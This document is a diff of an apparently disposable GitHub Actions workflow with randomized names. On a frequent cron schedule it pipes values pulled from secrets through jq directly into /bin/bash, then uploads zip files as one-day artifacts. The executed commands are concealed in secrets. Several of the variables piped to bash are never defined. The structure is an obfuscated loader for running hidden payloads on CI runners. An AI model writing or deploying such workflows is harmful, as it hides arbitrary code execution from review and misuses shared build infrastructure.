@@ -1,10 +1,9 @@
 name: nancydeborah8222
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '13 2/6 * * *'
 
+  schedule:
+    - cron: '32 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: nancydeborah8222
         env:
-          cfoq6: ${{ secrets.cfoq6 }}
+          hjy768: ${{ secrets.hjy768 }}
         run: |
-          echo $cfoq6 | jq -r .sol18 | /bin/bash
-          echo $fp7 | jq -r .p835 | /bin/bash
-          echo $g97725 | jq -r .nim4702 | /bin/bash
-          echo $d9 | jq -r .zmri69 | /bin/bash
-          echo $ri49942 | jq -r .lich25517 | /bin/bash
-          echo $vmd597 | jq -r .yzsss9 | /bin/bash
-          echo $snoml47932 | jq -r .bpr43802 | /bin/bash
-          echo $ozg9372 | jq -r .ulwk79944 | /bin/bash
-          echo $pzayl2 | jq -r .x6876 | /bin/bash
-          echo $yle5 | jq -r .lk262 | /bin/bash
+          printf '%s' "$hjy768" | jq -r .q6 | /bin/bash
+          printf '%s' "$p50" | jq -r .x76 | /bin/bash
+          printf '%s' "$mb6124" | jq -r .t37450 | /bin/bash
+          echo $eq71 | jq -r .wql28 | /bin/bash
+          printf '%s' "$rql96" | jq -r .lw11 | /bin/bash
+          printf '%s' "$ke62900" | jq -r .cy6352 | /bin/bash
+          echo $onr8 | jq -r .shgw57 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: her4UuyP
+          path: "*.zip"
+          retention-days: 1
